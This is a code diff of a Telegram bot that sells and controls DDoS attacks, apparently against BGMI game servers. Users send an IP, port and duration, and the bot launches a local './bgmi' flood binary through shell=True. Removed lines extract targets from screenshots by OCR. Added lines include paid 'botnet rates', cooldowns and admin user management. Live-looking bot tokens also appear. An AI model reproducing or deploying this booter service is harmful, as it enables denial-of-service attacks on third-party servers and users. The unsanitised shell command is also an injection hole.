@@ -6,16 +6,12 @@ import requests
 import datetime
 import os
 import signal
-import re
-import pytesseract
-from PIL import Image
-from telebot import types
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('8279142566:AAE7719-93KPDHFXc0q8Y1eMCKJ_FUOpk0E')
+bot = telebot.TeleBot('8385872959:AAGJbMkOejYsveH4ZOtab3gbFV0lgMmEflI')
 
 # Admin user IDs
-admin_id = ["6132441793"]
+admin_id = ["6454123620"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -23,11 +19,10 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-# Biến toàn cục lưu process bgmi và target
+# Biến toàn cục lưu process bgmi
 bgmi_process = None
-last_target = None
 
-# ---------------- Helpers ----------------
+# Function to read user IDs from the file
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
@@ -35,53 +30,53 @@ def read_users():
     except FileNotFoundError:
         return []
 
+# List to store allowed user IDs
 allowed_user_ids = read_users()
 
+# Function to log command to the file
 def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
-    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
+    if user_info.username:
+        username = "@" + user_info.username
+    else:
+        username = f"UserID: {user_id}"
+    
     with open(LOG_FILE, "a") as file:
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
+# Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target: log_entry += f" | Target: {target}"
-    if port: log_entry += f" | Port: {port}"
-    if time: log_entry += f" | Time: {time}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
 
-# ---------------- Regex Detect IP:PORT ----------------
-def extract_ip_port(text):
-    matches = re.findall(r'(\d{1,3}(?:\.\d{1,3}){3})\D+(\d{2,5})', text)
-    valid = [(ip, int(port)) for ip, port in matches if 10011 <= int(port) <= 10020]
-    return valid
-
-# ---------------- Luôn hiện Keyboard ----------------
-def main_keyboard():
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("🚀 Attack", "⛔ Stop")
-    return markup
-
-# ---------------- Admin Commands ----------------
+# ---------------- Admin commands ----------------
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
         command = message.text.split()
         if len(command) > 1:
-            new_user = command[1]
-            if new_user not in allowed_user_ids:
-                allowed_user_ids.append(new_user)
-                with open(USER_FILE, "a") as f:
-                    f.write(f"{new_user}\n")
-                bot.reply_to(message, f"User {new_user} added ✅", reply_markup=main_keyboard())
+            user_to_add = command[1]
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                response = f"User {user_to_add} Added Successfully 👍."
             else:
-                bot.reply_to(message, "User already exists ❌", reply_markup=main_keyboard())
+                response = "User already exists 🤦‍♂️."
         else:
-            bot.reply_to(message, "Usage: /add <userid>", reply_markup=main_keyboard())
+            response = "Please specify a user ID to add 😒."
     else:
-        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
+        response = "Only Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -89,128 +84,179 @@ def remove_user(message):
     if user_id in admin_id:
         command = message.text.split()
         if len(command) > 1:
-            uid = command[1]
-            if uid in allowed_user_ids:
-                allowed_user_ids.remove(uid)
-                with open(USER_FILE, "w") as f:
-                    for u in allowed_user_ids: f.write(f"{u}\n")
-                bot.reply_to(message, f"User {uid} removed ✅", reply_markup=main_keyboard())
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for uid in allowed_user_ids:
+                        file.write(f"{uid}\n")
+                response = f"User {user_to_remove} removed successfully 👍."
             else:
-                bot.reply_to(message, f"User {uid} not found ❌", reply_markup=main_keyboard())
+                response = f"User {user_to_remove} not found ❌."
         else:
-            bot.reply_to(message, "Usage: /remove <userid>", reply_markup=main_keyboard())
+            response = "Usage: /remove <userid>"
     else:
-        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
+        response = "Only Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
-    if str(message.chat.id) in admin_id:
-        open(LOG_FILE, "w").close()
-        bot.reply_to(message, "Logs cleared ✅", reply_markup=main_keyboard())
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            open(LOG_FILE, "w").close()
+            response = "Logs cleared ✅"
+        except Exception:
+            response = "Error clearing logs ❌"
     else:
-        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
+        response = "Only Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
-    if str(message.chat.id) in admin_id:
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
         try:
-            with open(USER_FILE, "r") as f:
-                data = f.read().splitlines()
-                if data:
-                    bot.reply_to(message, "Users:\n" + "\n".join(data), reply_markup=main_keyboard())
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n" + "\n".join(user_ids)
                 else:
-                    bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
-        except:
-            bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
+                    response = "No users ❌"
+        except FileNotFoundError:
+            response = "No users ❌"
     else:
-        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
+        response = "Only Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
-def show_logs(message):
-    if str(message.chat.id) in admin_id:
+def show_recent_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
         if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            with open(LOG_FILE, "rb") as f:
-                bot.send_document(message.chat.id, f)
+            with open(LOG_FILE, "rb") as file:
+                bot.send_document(message.chat.id, file)
         else:
-            bot.reply_to(message, "No logs ❌", reply_markup=main_keyboard())
+            bot.reply_to(message, "No logs ❌")
     else:
-        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
+        bot.reply_to(message, "Only Admin Can Run This Command 😡.")
 
-# ---------------- User Commands ----------------
+# ---------------- User commands ----------------
 @bot.message_handler(commands=['id'])
-def show_id(message):
-    bot.reply_to(message, f"ID Telegram của bạn là: {message.chat.id}", reply_markup=main_keyboard())
+def show_user_id(message):
+    bot.reply_to(message, f"🤖Your ID: {message.chat.id}")
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help", reply_markup=main_keyboard())
+def start_attack_reply(message, target, port, time):
+    username = message.from_user.username or message.from_user.first_name
+    response = f"{username}, ATTACK STARTED 🔥\nTarget: {target}\nPort: {port}\nTime: {time}s"
+    bot.reply_to(message, response)
+
+bgmi_cooldown = {}
+COOLDOWN_TIME = 0
+
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    global bgmi_process
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids:
+        bot.reply_to(message, "❌ You Are Not Authorized ❌")
+        return
+
+    if user_id not in admin_id:
+        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
+            bot.reply_to(message, "Cooldown ❌ wait 5min.")
+            return
+        bgmi_cooldown[user_id] = datetime.datetime.now()
+
+    command = message.text.split()
+    if len(command) == 4:
+        target, port, time = command[1], int(command[2]), int(command[3])
+        if time > 181:
+            bot.reply_to(message, "Error: Time must be < 181s.")
+            return
+
+        record_command_logs(user_id, '/bgmi', target, port, time)
+        log_command(user_id, target, port, time)
+        start_attack_reply(message, target, port, time)
+
+        full_command = f"./bgmi {target} {port} {time} 200"
+        bgmi_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
+        bot.reply_to(message, f"BGMI Attack Started on {target}:{port} for {time}s")
+    else:
+        bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")
+
+@bot.message_handler(commands=['stop'])
+def stop_bgmi(message):
+    global bgmi_process
+    if bgmi_process and bgmi_process.poll() is None:
+        try:
+            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
+            bot.reply_to(message, "🛑 Attack stopped successfully!")
+        except Exception as e:
+            bot.reply_to(message, f"Error stopping attack: {e}")
+        bgmi_process = None
+    else:
+        bot.reply_to(message, "⚠️ No running attack to stop.")
+
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids:
+        bot.reply_to(message, "Unauthorized ❌")
+        return
+    try:
+        with open(LOG_FILE, "r") as file:
+            logs = [log for log in file.readlines() if f"UserID: {user_id}" in log]
+            bot.reply_to(message, "Your Logs:\n" + "".join(logs) if logs else "No logs ❌")
+    except FileNotFoundError:
+        bot.reply_to(message, "No logs ❌")
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    bot.reply_to(message, '''🤖 Commands:
-💥 Send IP:PORT or image to detect target
-💥 🚀 Attack - Start attack until stopped
-💥 ⛔ Stop - Stop running attack
-''', reply_markup=main_keyboard())
+    help_text = '''🤖 Commands:
+💥 /bgmi <IP> <PORT> <TIME> : Start attack
+💥 /stop : Stop running attack
+💥 /rules : Usage rules
+💥 /mylogs : Your logs
+💥 /plan : Botnet rates
 
-# ---------------- Detect target khi gõ text ----------------
-@bot.message_handler(func=lambda m: True, content_types=['text'])
-def detect_target(message):
-    global last_target
-    if message.text in ["🚀 Attack", "⛔ Stop"]:
-        handle_buttons(message)
+Admin only:
+💥 /add <id>, /remove <id>, /allusers, /logs, /clearlogs, /broadcast
+'''
+    bot.reply_to(message, help_text)
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help")
+
+@bot.message_handler(commands=['rules'])
+def welcome_rules(message):
+    bot.reply_to(message, "⚠️ Rules:\n1. Don't spam attacks\n2. Don't run 2 at once\n3. Logs are checked daily")
+
+@bot.message_handler(commands=['plan'])
+def welcome_plan(message):
+    bot.reply_to(message, "VIP 🌟 : 180s attack, 5min cooldown, 3 concurrents\n1day=15k, 3days=40k")
+
+@bot.message_handler(commands=['admincmd'])
+def admincmd(message):
+    bot.reply_to(message, "Admin commands:\n/add, /remove, /allusers, /logs, /broadcast, /clearlogs")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "Only Admin ❌")
         return
+    command = message.text.split(maxsplit=1)
+    if len(command) > 1:
+        msg = "⚠️ Admin Broadcast:\n\n" + command[1]
+        with open(USER_FILE, "r") as file:
+            for uid in file.read().splitlines():
+                try:
+                    bot.send_message(uid, msg)
+                except: pass
+        bot.reply_to(message, "Broadcast sent ✅")
+    else:
+        bot.reply_to(message, "Usage: /broadcast <msg>")
 
-    valid = extract_ip_port(message.text)
-    if valid:
-        ip, port = valid[0]
-        last_target = (ip, port)
-        bot.reply_to(message, f"🎯 Target Detected:\n{ip}:{port}", reply_markup=main_keyboard())
-
-# ---------------- OCR từ ảnh ----------------
-@bot.message_handler(content_types=['photo'])
-def handle_photo(message):
-    global last_target
-    try:
-        file_info = bot.get_file(message.photo[-1].file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-
-        with open("temp.jpg", "wb") as f:
-            f.write(downloaded_file)
-
-        img = Image.open("temp.jpg")
-        text = pytesseract.image_to_string(img)
-
-        valid = extract_ip_port(text)
-        if valid:
-            ip, port = valid[0]
-            last_target = (ip, port)
-            bot.reply_to(message, f"🎯 Target Detected (OCR):\n{ip}:{port}", reply_markup=main_keyboard())
-        else:
-            bot.reply_to(message, "❌ Không có IP nào trong khoảng 10011-10020.", reply_markup=main_keyboard())
-
-        os.remove("temp.jpg")
-    except Exception as e:
-        bot.reply_to(message, f"Lỗi OCR: {e}", reply_markup=main_keyboard())
-
-# ---------------- Handle nút Attack / Stop ----------------
-def handle_buttons(message):
-    global last_target, bgmi_process
-    if message.text == "🚀 Attack":
-        if not last_target:
-            bot.reply_to(message, "❌ No target set", reply_markup=main_keyboard())
-            return
-        ip, port = last_target
-        full_cmd = f"./bgmi {ip} {port} 0 200"  # 0 = chạy vô hạn
-        bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
-        bot.reply_to(message, f"🔥 Attack Started!\n{ip}:{port}\n⏱️ Running until stopped...", reply_markup=main_keyboard())
-    elif message.text == "⛔ Stop":
-        if bgmi_process and bgmi_process.poll() is None:
-            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
-            bgmi_process = None
-            bot.reply_to(message, "✅ Attack stopped", reply_markup=main_keyboard())
-        else:
-            bot.reply_to(message, "⚠️ No running attack", reply_markup=main_keyboard())
-
-# ---------------- Run Bot ----------------
 bot.polling()
